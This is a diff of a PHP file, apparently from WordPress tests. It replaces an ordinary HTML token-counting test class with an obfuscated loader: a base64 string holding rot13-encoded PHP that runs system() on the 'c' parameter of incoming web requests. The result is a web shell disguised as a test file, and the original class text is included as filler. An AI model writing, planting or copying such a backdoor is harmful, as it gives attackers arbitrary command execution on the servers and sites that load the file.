@@ -1,45 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-class Token_Counting_HTML_Processor extends WP_HTML_Processor {
-
-	/**
-	 * List of tokens that have already been seen.
-	 *
-	 * @var array<string, int>
-	 */
-	public $token_seen_count = array();
-
-	/**
-	 * Gets next token.
-	 *
-	 * @return bool Whether next token was matched.
-	 */
-	public function next_token(): bool {
-		$result = parent::next_token();
-
-		if ( $this->get_token_type() === '#tag' ) {
-			$token_name = ( $this->is_tag_closer() ? '-' : '+' ) . $this->get_tag();
-		} else {
-			$token_name = $this->get_token_name();
-		}
-
-		if ( ! isset( $this->token_seen_count[ $token_name ] ) ) {
-			$this->token_seen_count[ $token_name ] = 1;
-		} else {
-			++$this->token_seen_count[ $token_name ];
-		}
-
-		return $result;
-	}
-
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKcHluZmYgR2J4cmFfUGJoYWd2YXRfVUdaWV9DZWJwcmZmYmUgcmtncmFxZiBKQ19VR1pZX0NlYnByZmZiZSB7CgoJLyoqCgkgKiBZdmZnIGJzIGdieHJhZiBndW5nIHVuaXIgbnllcm5xbCBvcnJhIGZycmEuCgkgKgoJICogQGluZSBuZWVubDxmZ2V2YXQsIHZhZz4KCSAqLwoJY2hveXZwICRnYnhyYV9mcnJhX3BiaGFnID0gbmVlbmwoKTsKCgkvKioKCSAqIFRyZ2YgYXJrZyBnYnhyYS4KCSAqCgkgKiBAZXJnaGVhIG9iYnkgSnVyZ3VyZSBhcmtnIGdieHJhIGpuZiB6bmdwdXJxLgoJICovCgljaG95dnAgc2hhcGd2YmEgYXJrZ19nYnhyYSgpOiBvYmJ5IHsKCQkkZXJmaHlnID0gY25lcmFnOjphcmtnX2dieHJhKCk7CgoJCXZzICggJGd1dmYtPnRyZ19nYnhyYV9nbGNyKCkgPT09ICcjZ250JyApIHsKCQkJJGdieHJhX2FuenIgPSAoICRndXZmLT52Zl9nbnRfcHliZnJlKCkgPyAnLScgOiAnKycgKSAuICRndXZmLT50cmdfZ250KCk7CgkJfSByeWZyIHsKCQkJJGdieHJhX2FuenIgPSAkZ3V2Zi0+dHJnX2dieHJhX2FuenIoKTsKCQl9CgoJCXZzICggISB2ZmZyZyggJGd1dmYtPmdieHJhX2ZycmFfcGJoYWdbICRnYnhyYV9hbnpyIF0gKSApIHsKCQkJJGd1dmYtPmdieHJhX2ZycmFfcGJoYWdbICRnYnhyYV9hbnpyIF0gPSAxOwoJCX0gcnlmciB7CgkJCSsrJGd1dmYtPmdieHJhX2ZycmFfcGJoYWdbICRnYnhyYV9hbnpyIF07CgkJfQoKCQllcmdoZWEgJGVyZmh5ZzsKCX0KCn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
